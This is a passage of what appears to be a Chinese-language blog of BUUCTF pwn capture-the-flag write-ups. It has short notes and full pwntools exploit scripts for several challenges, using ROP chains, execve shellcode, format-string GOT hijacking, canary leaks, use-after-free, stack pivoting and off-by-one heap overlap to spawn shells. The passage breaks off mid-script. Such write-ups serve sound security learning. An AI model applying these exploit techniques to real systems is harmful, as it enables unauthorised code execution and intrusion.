id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h3><h4 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h4><p>虽然同上都是静态编译，但是这次限制了输入长度，也没有system函数。但是使用ROPgadget发现int 0x80，可以借助int80(11,”&#x2F;bin&#x2F;sh”,null,null)执行。</p><p><a href="https://blog.csdn.net/xiaominthere/article/details/17287965">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/usr/i</span>nclude<span class="hljs-regexp">/x86_64-linux-gnu/</span>asm/unistd_32.h   <span class="hljs-comment">#查看32位系统调用号</span><br><span class="hljs-comment">#define __NR_execve 11</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#r = process(&quot;./rop&quot;)</span><br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29705</span>)<br>int_addr = <span class="hljs-number">0x80493e1</span><br>pop_eax = <span class="hljs-number">0x80bae06</span><br>read_addr = <span class="hljs-number">0x0806CD50</span><br>binsh_addr = <span class="hljs-number">0x080EB584</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806e850</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(<span class="hljs-number">0x8</span>)    <span class="hljs-comment">#注意将参数pop出去</span><br>payload += p32(pop_eax) + p32(<span class="hljs-number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(int_addr)<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h3><p><strong>反汇编和汇编</strong>               <a href="https://www.cnblogs.com/Theffth-blog/p/12674951.html">https://www.cnblogs.com/Theffth-blog/p/12674951.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-comment">#p = process(&#x27;./login&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27382</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;username: &#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>)<br>payload = (<span class="hljs-string">b&#x27;2jctf_pa5sw0rd&#x27;</span>).ljust(<span class="hljs-number">0x60</span>-<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">0x400e88</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password: &#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h3><p>这个题用两次close关闭了1和2，对应的文件描述符就是标准输出和标准错误输出。也就是说其实已经到执行system了，只是关闭输出后，无法查看回显。所以我们可以把标准输出重定向到标准输入。   <a href="https://blog.csdn.net/xirenwang/article/details/104139866">https://blog.csdn.net/xirenwang/article/details/104139866</a></p><p><img src="/2023/05/04/buuctf-pwn/image-20230418222432608.png" alt="image-20230418222432608"></p><h3 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h3><h4 id="格式化字符串-劫持got表、fmtstr-payload"><a href="#格式化字符串-劫持got表、fmtstr-payload" class="headerlink" title="格式化字符串-劫持got表、fmtstr_payload"></a>格式化字符串-劫持got表、fmtstr_payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;./fmt32&quot;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,&quot;29394&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./fmt32&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-comment">#泄漏libc基址</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> + p32(read_got) + <span class="hljs-string">b&#x27;%8$s&#x27;</span><br>p.sendafter(<span class="hljs-string">&#x27;me:&#x27;</span>, payload)<br>read_addr = u32(p.recv(<span class="hljs-number">18</span>)[-<span class="hljs-number">4</span>:])<br>libc_base = read_addr - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0x3a80c</span><br><span class="hljs-comment">#将read got表地址改为one_gadget</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> + fmtstr_payload(<span class="hljs-number">8</span>, &#123;read_got: one_gadget&#125;,numbwritten = <span class="hljs-number">0xa</span>)   <span class="hljs-comment">#printf已经输出“Repeater:a” 0xa个字符</span><br>p.sendafter(<span class="hljs-string">&#x27;me:&#x27;</span>, payload)<br><span class="hljs-comment">#p.sendline(&#x27;cat flag.txt&#x27;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h3><p>汇编shellcode、int 0x80</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&quot;i386&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>r=process(<span class="hljs-string">&#x27;./start&#x27;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26537)</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,payload)<br>stack_addr = u32(r.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-built_in">hex</span>(stack_addr))<br>shellcode=asm( <span class="hljs-string">&quot;xor ecx,ecx;xor edx,edx ; push edx;push 0x68732f6e;push 0x69622f2f; mov ebx,esp;mov eax,0xb;int 0x80 &quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+p32(stack_addr+<span class="hljs-number">0x14</span>)+shellcode<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h3><p>汇编shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ciscn_s_9&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29280</span>)<br>jump_esp=<span class="hljs-number">0x8048554</span><br>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">xor edx,edx</span><br><span class="hljs-string">push edx</span><br><span class="hljs-string">push 0x68732f2f</span><br><span class="hljs-string">push 0x6e69622f</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">mov al,0xB</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))  <span class="hljs-comment">#23</span><br>payload=shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p32(jump_esp)<br>payload+=asm(<span class="hljs-string">&quot;sub esp,40;call esp&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="others-babystack"><a href="#others-babystack" class="headerlink" title="others_babystack"></a>others_babystack</h3><p>canary泄漏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#r=process(&#x27;./babystack&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25780</span>)<br>pop_rdi=<span class="hljs-number">0x400a93</span><br>elf=ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr=<span class="hljs-number">0x400908</span><br><span class="hljs-comment">#泄漏canary</span><br>r.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x88</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;a\n&#x27;</span>)<br>canary=u64(r.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-comment">#得到put加载地址，libcsearcher</span><br>r.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr))<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>r.recv()<br>puts_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x90</span>-<span class="hljs-number">0x8</span>)+p64(canary)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span><br>payload+=p64(pop_rdi)+p64(bin_addr)+p64(system_addr)<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendline(payload)<br>r.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>每次create(new)会产生两块chunk(chunk0、chunk1)，申请两次(chunk0-3)，全部free；再次申请指定大小，将chunk0、chunk2申请出来，此时chunk0作为数据可写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br>r = process(<span class="hljs-string">&quot;./ciscn&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn&quot;</span>)<br>system_addr = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">num,tp,length,value</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;CNote &gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index &gt; &quot;</span>,<span class="hljs-built_in">str</span>(num))<br>    r.sendlineafter(<span class="hljs-string">&quot;Type &gt; &quot;</span>,<span class="hljs-built_in">str</span>(tp))<br>    r.sendlineafter(<span class="hljs-string">&quot;Length &gt; &quot;</span>,<span class="hljs-built_in">str</span>(length))<br>    r.sendlineafter(<span class="hljs-string">&quot;Value &gt; &quot;</span>,value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">num</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;CNote &gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index &gt; &quot;</span>,<span class="hljs-built_in">str</span>(num))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">num</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;CNote &gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index &gt; &quot;</span>,<span class="hljs-built_in">str</span>(num))<br><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">b&#x27;bash&#x27;</span> + p32(system_addr)<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,payload)<br>delete(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h3><h4 id="栈迁移-2"><a href="#栈迁移-2" class="headerlink" title="栈迁移"></a>栈迁移</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p =process(&#x27;./stack&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26941</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./stack&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>rdi=<span class="hljs-number">0x400703</span><br>main=<span class="hljs-number">0x400626</span><br>one_gadget = <span class="hljs-number">0x4526a</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;want\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x601080</span>+<span class="hljs-number">0xa0</span>-<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x400699</span>))       <span class="hljs-comment">#有可能覆盖got.plt表，需要抬栈</span><br>p.recvuntil(<span class="hljs-string">&quot;now!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa0</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main))<br>puts_addr=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libcbase=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>one_gadget=libcbase+<span class="hljs-number">0x4526a</span><br>p.recvuntil(<span class="hljs-string">&quot;want\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(one_gadget))<br>p.recvuntil(<span class="hljs-string">&quot;now!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h3><h4 id="off-by-one、chunk-overlap"><a href="#off-by-one、chunk-overlap" class="headerlink" title="off-by-one、chunk overlap"></a>off-by-one、chunk overlap</h4><img src="image-20230420091521198.png" alt="image-20230420091521198" style="zoom:80%;" /><ol><li>利用 off-by-one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小，然后 free 加入fastbin；</li><li>从 fastbin 中申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针；</li><li>通过show 泄漏libc，进一步修改free的got表地址，实现got表劫持。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;)<br><span class="hljs-comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27636)</span><br>elf=ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>     p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>     p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>     p.recvuntil(<span class="hljs-string">&#x27;Heap : &#x27;</span>)<br>     p.sendline(<span class="hljs-built_in">str</span>(size))<br>     p.recvuntil(<span class="hljs-string">&#x27;heap:&#x27;</span>)<br>     p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27; :&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&#x27;heap :&#x27;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27; :&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27; :&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)  <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)  <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)  <span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x81&#x27;</span>)         <span class="hljs-comment">#off-by-one修改1的size</span><br><br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x8</span>)+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))   <span class="hljs-comment">#修改2的指针指向free_got</span><br>show(<span class="hljs-number">2</span>)<br>free_addr=u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))   <span class="hljs-comment">#泄漏free加载地址</span><br>log.success(<span class="hljs-string">&#x27;free_addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(free_addr))<br>libcbase=free_addr-libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;system_addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br><br>edit(<span class="hljs-number">2</span>,p64(system_addr))           <span class="hljs-comment">#修改free_got地址</span><br>delete(<span class="hljs-number">0</span>)                          <span class="hljs-comment">#执行system(&#x27;/bin/sh&#x27;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h3><h4 id="unlink、栈溢出"><a href="#unlink、栈溢出" class="headerlink" title="unlink、栈溢出"></a>unlink、栈溢出</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 